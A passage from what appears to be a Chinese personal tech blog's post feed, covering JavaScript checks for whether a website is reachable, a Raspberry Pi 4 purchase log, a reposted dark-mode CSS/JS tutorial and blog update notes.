<span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 